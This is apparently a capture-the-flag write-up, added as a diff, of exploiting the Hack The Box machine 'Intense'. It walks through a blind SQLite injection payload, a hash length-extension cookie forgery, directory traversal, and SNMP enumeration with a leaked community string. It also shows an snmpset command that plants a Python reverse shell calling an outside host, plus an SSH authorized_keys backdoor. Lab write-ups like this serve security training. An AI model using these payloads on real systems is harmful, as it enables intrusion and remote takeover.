@@ -1,0 +1,115 @@
+[+] Logged in as guest:guest.
+
+[*] Found a zip-file with source code.
+
+[+] App is vulnerable to SQLi at /submitmessage.
+
+- Payload length must be at most 140 characters.
+- Payload must not contain the following words: ["rand", "system", "exec", "date"].
+- DBMS is SQLite3.
+
+[*] So, I'm going to craft a Flask application to handle authentication and deliver SQLmap payloads to the application.
+
+[-] SQLmap didn't work. Let's do this manually.
+
+[*] The injectable query is: insert into messages values ('%s')" % message
+
+- This is going to be a blind injection because we can't access the inserted entry.
+
+- To jump out of those quotes and braces, we'll use "')" as the start of the payload. This way the query will evaluate to the following: insert into messages values ('')')
+
+- To get rid of trailing "')", we'll insert a comment sign to the end of the payload. So, the query will evaluate to the following: insert into messages values ('')--')
+
+- To separate queries, but NOT stack them, we'll insert a comma after "')" at the start of our payload. Like this: insert into messages values (''),--'). 
+
+- After that, we should wrap our subquery into double braces: insert into messages values (''),((subquery))--').
+
+- For a blind injection we need a conditional statement to evaluate server-side. We'll use "SELECT CASE WHEN".
+
+- So, if condition is true, the query will be successfully executed. Otherwise, we would normally call `sleep`. But in SQLite `sleep` is not implemented. Instead, we'll produce a runtime error for the false case by using ZEROBLOB(1000000000).
+
+- The final payload will look like this: "'),((SELECT CASE WHEN %s THEN 1 ELSE ZEROBLOB(1000000000) END))--" % (condition)
+
+[*] Using the payload above we'll guess SHA256 hash of admin's password ("secret" field). Writing the script.
+
+limitedeternity$ python3 sqli.py 
+Secret: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
+
+[+] Ta-da. Now we need to forge session cookie, because this hash appears to be non-bruteforcable.
+
+[*] lwt.py does the cookie signing.
+
+> sha256(os.urandom(randrange(8, 15)) + msg).digest()
+
+[*] Look there: https://en.wikipedia.org/wiki/Length_extension_attack
+
+- tl;dr: Hashing algorithms based on Merkle–Damgård construction operate on blocks using an internal state, which can be replicated and used afterwards to append more data while still producing a valid signature.
+
+- Dictionaries in Python behave this way:
+
+>>> {k:v for [k, v] in map(lambda t: t.split("="), "username=guest;username=admin".split(";"))}
+{'username': 'admin'}
+
+- `is_admin` uses a username and a session (SHA256 password hash) to check if user is admin.
+
+[*] So, we need to perform this attack to trick the system into distinguishing us as admin.
+
+[*] I'll use [HashPump](https://github.com/bwall/HashPump) for that.
+
+[+] Done! We are logged in as admin. Now we are able to access to:
+
+- /admin/log/view, which is vulnerable to directory traversal.
+- /admin/log/dir, which is vulnerable to directory traversal.
+
+[+] Got user.txt!
+
+[*] Retrieved note_server.c and /etc/snmp/snmpd.conf
+
+[+] rwcommunity SuP3RPrivCom90. Retrieving data:
+
+snmpwalk -c SuP3RPrivCom90 -v 1 10.10.10.195 2>&1 | tee "/media/psf/Home/Downloads/results/10.10.10.195/scans/udp_161_snmp_snmpwalk.txt"
+
+snmpwalk -c SuP3RPrivCom90 -v 1 10.10.10.195 1.3.6.1.2.1.25.1.6.0 2>&1 | tee "/media/psf/Home/Downloads/results/10.10.10.195/scans/udp_161_snmp_snmpwalk_system_processes.txt"
+
+snmpwalk -c SuP3RPrivCom90 -v 1 10.10.10.195 1.3.6.1.2.1.25.4.2.1.2 2>&1 | tee "/media/psf/Home/Downloads/results/10.10.10.195/scans/udp_161_snmp_snmpwalk_running_processes.txt"
+
+snmpwalk -c SuP3RPrivCom90 -v 1 10.10.10.195 1.3.6.1.2.1.25.4.2.1.4 2>&1 | tee "/media/psf/Home/Downloads/results/10.10.10.195/scans/udp_161_snmp_snmpwalk_process_paths.txt"
+
+snmpwalk -c SuP3RPrivCom90 -v 1 10.10.10.195 1.3.6.1.2.1.25.2.3.1.4 2>&1 | tee "/media/psf/Home/Downloads/results/10.10.10.195/scans/udp_161_snmp_snmpwalk_storage_units.txt"
+
+snmpwalk -c SuP3RPrivCom90 -v 1 10.10.10.195 1.3.6.1.2.1.25.6.3.1.2 2>&1 | tee "/media/psf/Home/Downloads/results/10.10.10.195/scans/udp_161_snmp_snmpwalk_software_names.txt"
+
+snmpwalk -c SuP3RPrivCom90 -v 1 10.10.10.195 1.3.6.1.4.1.77.1.2.25 2>&1 | tee "/media/psf/Home/Downloads/results/10.10.10.195/scans/udp_161_snmp_snmpwalk_user_accounts.txt"
+
+snmpwalk -c SuP3RPrivCom90 -v 1 10.10.10.195 1.3.6.1.2.1.6.13.1.3 2>&1 | tee "/media/psf/Home/Downloads/results/10.10.10.195/scans/udp_161_snmp_snmpwalk_tcp_ports.txt"
+
+[+] Found libc version: libc6-2.27-3ubuntu1
+
+[*] Look:
+
+> iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
+> rwcommunity
+
+[+] 2+2 = https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e:
+
+snmpset -m +NET-SNMP-EXTEND-MIB -v 1 -c SuP3RPrivCom90 10.10.10.195 \
+'nsExtendStatus."revtcp"'  = createAndGo \
+'nsExtendCommand."revtcp"' = /usr/bin/python3 \
+'nsExtendArgs."revtcp"'    = '-c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.29\",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'
+
+snmpwalk -v 1 -c SuP3RPrivCom90 10.10.10.195 nsExtendObjects
+
+[+] Got a reverse TCP shell! Now, we need to do an SSH forwarding. Backdoor ~/.ssh/authorized_keys. After that:
+
+ssh -L 9999:127.0.0.1:5001 Debian-snmp@10.10.10.195 -N
+
+[*] -N is to prevent disconnection. note_server from 10.10.10.195 will be available on port 9999. Download the binary from server and fetch libc.
+
+Debian-snmp@intense:/home/user$ uname -a
+
+Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+
+[*]
+
+Marises-MacBook:loot limitedeternity$ checksec -f note_server
+ELF64: | Canary: true CFI: false SafeStack: false Fortify: false Fortified: 0 NX: true PIE: Full Relro: Full RPATH: None RUNPATH: None | File: note_server
